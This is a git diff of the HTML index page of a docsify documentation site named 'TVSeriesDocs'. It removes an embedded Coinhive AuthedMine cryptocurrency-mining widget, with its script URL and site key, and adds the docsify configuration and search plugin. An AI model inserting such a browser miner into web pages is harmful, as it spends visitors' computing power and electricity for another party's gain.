@@ -10,11 +10,32 @@
   <link rel="stylesheet" href="//unpkg.com/docsify/lib/themes/vue.css">
 </head>
 <body>
-<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-<div class="coinhive-miner" 
-	style="width: 256px; height: 310px"
-	data-key="vFBxVDja8JAPIzCbNmCzNX4s48EVuAJP">
-	<em>Loading...</em>
-</div>
+  <div id="app"></div>
+
+ <script>
+    window.$docsify = {
+      name: 'TVSeriesDocs',
+      repo: 'AyyKamp/TVSeriesDocs',
+      auto2top: true,
+      coverpage: true,
+      loadSidebar: true,
+      maxLevel: 3,
+      subMaxLevel: 3,
+      search: {
+        noData: {
+          '/': 'Keine Ergebnisse!'
+        },
+        paths: 'auto',
+        placeholder: {
+          '/': 'Suche'
+        }
+      }
+  }
+  </script>
+ 
+  <script src="//unpkg.com/docsify/lib/docsify.min.js"></script>
+  <script src="//unpkg.com/docsify/lib/plugins/search.min.js"></script>
+	
+
 </body>
 </html>
